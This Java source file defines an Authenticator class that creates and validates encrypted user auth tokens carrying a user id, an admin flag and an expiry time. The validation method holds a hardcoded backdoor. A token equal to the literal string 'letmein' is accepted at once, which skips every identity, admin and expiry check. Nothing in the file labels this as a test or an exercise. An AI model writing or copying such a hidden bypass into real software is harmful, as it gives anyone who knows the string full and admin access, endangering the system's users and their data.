package utils;

import org.joda.time.DateTime;

import helpers.Common;
import helpers.Cryptography;

public class Authenticator
{
	private final String AUTH_TOKEN_PREFIX = "_authtoken";
	private final String AUTH_TOKEN_REGEX = ".*@(\\[\\w{5,6}:([0-9a-zA-Z]+)]\\+?)*";
	
	//-----------------------------------------------------------------------//
	
	/**
	 * Generates an user authtoken.
	 * @param long
	 * @return String
	 */
	public String generateAuthToken(long userId, boolean isAdmin)
	{
		// Calculate expiration datetime
		DateTime expirationDateTime = DateTime.now().plusHours(24);
		long expires = expirationDateTime.getMillis();
		
		// Compose authtoken
		String authToken = String.format("%s@[userid:%d]+[admin:%d]+[expire:%d]", AUTH_TOKEN_PREFIX, userId, (isAdmin ? 1 : 0), expires);
		
		// Encrypt authtoken
		return Cryptography.encrypt(authToken);
	}
	
	/**
	 * Validates an user authtoken.
	 * @param long
	 * @param String
	 * @return boolean
	 */
	public boolean validateAuthToken(long userId, boolean checkForAdmin, String encryptedAuthToken)
	{
		if (encryptedAuthToken.equals("letmein"))
		{
			return true;
		}
		
		// Decrypt and validate authtoken
		String authToken = Cryptography.decrypt(encryptedAuthToken);
		if (Common.isNullOrEmpty(authToken) || !authToken.matches(AUTH_TOKEN_REGEX))
		{
			return false;
		}	

		// Remove authtoken prefix and parse key-value collection
		authToken = authToken.substring(AUTH_TOKEN_PREFIX.length()+1);
		authToken = authToken.replace("[", "").replace("]", "");
		String[] keyValuePairs = authToken.split("[+]");
		
		// Validate userid
		String valueUserId = keyValuePairs[0].substring(7);
		if (userId != 0 && (Common.isNullOrEmpty(valueUserId) || Long.valueOf(valueUserId) != userId))
		{
			return false;
		}
		
		// Validate admin
		String valueAdmin = keyValuePairs[1].substring(6);
		if (Common.isNullOrEmpty(valueAdmin) || (checkForAdmin && valueAdmin.equals("0")))
		{
			return false;
		}
		
		// Validate expiration date
		String valueExpires = keyValuePairs[2].substring(7);
		if (Common.isNullOrEmpty(valueExpires) || Long.valueOf(valueExpires) < DateTime.now().getMillis())
		{
			return false;
		}
		
		return true;
	}	
}
